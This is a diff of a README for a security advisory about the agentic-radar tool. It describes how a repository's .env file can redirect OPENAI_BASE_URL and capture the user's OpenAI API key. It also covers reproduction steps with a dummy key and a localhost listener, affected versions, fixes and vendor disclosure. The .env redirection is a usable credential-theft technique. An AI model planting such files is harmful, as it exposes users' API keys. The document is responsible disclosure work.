@@ -1,76 +1,76 @@
-# agentic-radar — CVE submission pack
+# agentic-radar — OpenAI API key exfiltration via repository-controlled `.env`
 
-**Status:** no CVE assigned yet. Submission prepared for the **GitHub CNA** via a private
-security advisory on `github.com/splx-ai/agentic-radar`. When issued it will be
-`CVE-2026-XXXXX` (assignment year 2026).
+`agentic-radar`'s `scan openai-agents` command sends the user's OpenAI API key to a host
+named in a `.env` file that the scanned repository controls. No flag, prompt or warning.
 
-**Package:** `agentic-radar` (PyPI) · **Repo:** `splx-ai/agentic-radar`
-**Audited:** 0.14.1, commit `65a7e4bd01e2034c7cb52e9620eeed287688cc53` (2025-11-27)
-**Affected range:** `>=0.9.1, <=0.14.1` (per-release wheel inspection; see
-`cve-submission/range-verification.txt`)
-**Patched versions:** none at time of writing
-
-## What is here
-
-| Path | Purpose |
+| | |
 |---|---|
-| `cve-submission/advisory.md` | Ready-to-paste GitHub Security Advisory body (metadata, description, PoC, impact, fix) |
-| `cve-submission/attack-path-simple.md` | Plain-language explanation of how the attack works, no jargon |
-| `cve-submission/attacker-cost.md` | What the attack costs an attacker: cash, time, infrastructure, economics |
-| `cve-submission/pocs/exfil_listener.py` | Capture listener used in the PoC (attach to the advisory) |
-| `cve-submission/range-verification.txt` | Per-release derivation of the affected range, including the 0.7.0 negative result |
-| `cve-submission/MANIFEST.txt` | sha256 of every file in this pack |
-| `20261111/231619/` | Full assessment report, evidence, and PoC (source of truth) |
+| Package | `agentic-radar` (PyPI) |
+| Source | `github.com/splx-ai/agentic-radar` |
+| Audited | 0.14.1, commit `65a7e4bd01e2034c7cb52e9620eeed287688cc53` (2025-11-27) |
+| Affected | `0.9.1` – `0.14.1` |
+| Fixed in | none; 0.14.1 is latest and affected |
+| Severity | High — CVSS 3.1 **7.4** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` |
+| CWE | CWE-15, CWE-522 |
+| Reported by | Teycir ([github.com/Teycir](https://github.com/Teycir)) |
+| Status | submitted to VulDB (CNA), no CVE assigned yet |
 
-## Why one CVE, not three
+## Issue
 
-Only RT-01 (credential exfiltration) meets CNA thresholds: working PoC, credential theft,
-current release. RT-02 is a local crash on malformed input; RT-03 is a latent library-only
-XSS whose CLI path is already escaped. Mention both in the advisory body as secondary notes;
-do not request separate IDs.
+`agentic_radar/cli.py:37` calls `load_dotenv()` at import time. The bundled deprecated
+`dotenv` 0.9.9 package starts its search at the installed `agentic_radar` package directory
+and walks upward, so when the tool is installed inside a checkout (in-repo `.venv`, editable
+install — the layout of the project's own `examples/github_workflow/auto-agentic-radar.yaml`)
+a `.env` from that repository is loaded. `scan openai-agents` then builds `openai.OpenAI()`
+without validating `OPENAI_BASE_URL` and sends `chat.completions` requests, so the key lands
+in `Authorization: Bearer` at the attacker's host.
 
-## Submission plan — do not rely on the GitHub CNA alone
+## Reproduce
 
-GitHub only assigns a CVE **after the maintainer publishes** the private advisory. A ghosted
-maintainer therefore blocks the whole process, which is what happened on previous reports.
-The GitHub advisory stays as a courtesy channel; the critical path is a CNA that assigns
-unilaterally.
+1. In an empty directory create `.env`:
+   ```
+   OPENAI_API_KEY=sk-DUMMY-DO-NOT-USE
+   OPENAI_BASE_URL=http://localhost:8899/v1
+   ```
+2. `python3.12 -m venv .venv && .venv/bin/pip install "agentic-radar[openai-agents]==0.14.1"`
+3. Start a loopback HTTP listener that logs request headers.
+4. `cd / && OPENAI_API_KEY=sk-DUMMY-DO-NOT-USE /path/to/.venv/bin/agentic-radar scan openai-agents -i sample`
 
-Full procedure: **`cna/playbook.md`**.
+Expected: two `POST /v1/chat/completions` requests reach the listener with
+`Authorization: Bearer sk-DUMMY-DO-NOT-USE`, and the scan exits 0.
 
-| File | Purpose |
+## Scope
+
+- **Affected:** 0.9.1 – 0.14.1 — 0.9.1 is the first release with both the import-time `.env`
+  load and an unconditional LLM call in this analyzer.
+- **Not affected:** installs outside the scanned repository (pipx, system-wide, standalone
+  venv) — the upward search never reaches the repository `.env`. Verified control: 0 requests.
+- **Not affected for this command:** 0.7.0 – 0.8.x — the only `chat.completions` call is
+  behind the explicit `--enhance-prompts` flag.
+
+## Fix
+
+- Do not call `load_dotenv()` at import time; require an explicit `--env-file` path.
+- Reject a non-default `OPENAI_BASE_URL` unless explicitly opted in, and print the resolved
+  base URL before sending prompts.
+- Make LLM-backed analysis opt-in.
+
+## Evidence
+
+| Path | Contents |
 |---|---|
-| `cna/playbook.md` | Route comparison, sequence, duplicate-ID handling, evidence rules |
-| `cna/vendor-notice.md` | Email to `developers@splx.ai` with a 10-business-day deadline |
-| `cna/vuldb-submission.md` | Fast-lane CNA submission (assigns without maintainer) |
-| `cna/mitre-submission.md` | CNA-of-last-resort form, field by field |
-| `cna/certcc-vince.md` | Coordinator route for a vendor that engages and stalls |
-| `cna/contact-log.md` | Fill-as-you-go evidence log; MITRE requires it |
+| `cve-submission/advisory.md` | Full advisory: metadata, description, PoC, impact, fix |
+| `cve-submission/range-verification.txt` | Per-release derivation of the affected range |
+| `evidence/listener.log` | Captured requests with the dummy key |
+| `evidence/scan_stdout.txt` | Scan output, exit 0, no warning |
+| `evidence/rt01_negative_control_outside_venv.txt` | Negative control: 0 requests |
+| `evidence/vendor_notice_20261112.eml` | Sent vendor notice, verbatim |
+| `report_20261111_232106.md` | Full assessment report |
+| `cve-submission/MANIFEST.txt` | sha256 of the submission pack |
 
-Sequence: T0 vendor notice + VulDB submission → T+10 business days MITRE if no VulDB ID →
-T+45 days CERT/CC only if the vendor replied but will not fix. Never file two CNAs in
-parallel; first assigned ID is canonical.
+## Disclosure
 
-The GitHub advisory route is **unavailable on this repository**: private vulnerability
-reporting is disabled, there is no Security tab, and `security/advisories/new` cannot be
-opened. The GitHub CNA is therefore closed until the maintainer enables PVR. The email is the
-contact of record.
-
-1. Email `developers@splx.ai`, Cc `ante@splx.ai` — body in `cna/vendor-notice.md`.
-2. Same day, submit to VulDB — it assigns without vendor involvement.
-3. If the email bounces, open a public issue or discussion **asking only for a security
-   contact**, with no technical detail, and log it. Never describe the bug in a public thread.
-4. Keep the CVSS/CWE/range text above for the VulDB and MITRE forms.
-
-## Scoring caveat
-
-7.4 depends on `S:C` (credential belongs to the victim's OpenAI organisation, not the tool).
-If the CNA rejects scope change, the same vector scores **6.5 Medium** with `S:U`.
-Submit 7.4 with the rationale; expect 6.5.
-
-**CWE:** primary `CWE-15` (External Control of System or Configuration Setting), secondary
-`CWE-522` (Insufficiently Protected Credentials). The earlier report's `CWE-426` is a weaker
-fit (that CWE targets executable/library search paths); `CWE-427` is the defensible
-search-path alternative if the CNA prefers it.
-
-*Generated 2026-11-11T23:58:35Z. All claims traceable to `20261111/231619/`.*
+Vendor notified `2026-11-12T00:26:10Z` at `developers@splx.ai` (Cc `ante@splx.ai`), Message-ID
+`<AFRc0PZKfwKA0vhEbrH5s_7PN2phfIT_Npa7V6UOuitZ2oW9wuXIzBpqdLiBiMVyeejORT-XWZPqE8FiPm-r6wiuAbsN720Pw0ISzMPDt6I=@protonmail.com>`,
+no reply. Submitted to VulDB, which is a CNA. Not submitted to any other CNA. GitHub private
+vulnerability reporting is disabled on the upstream repository.
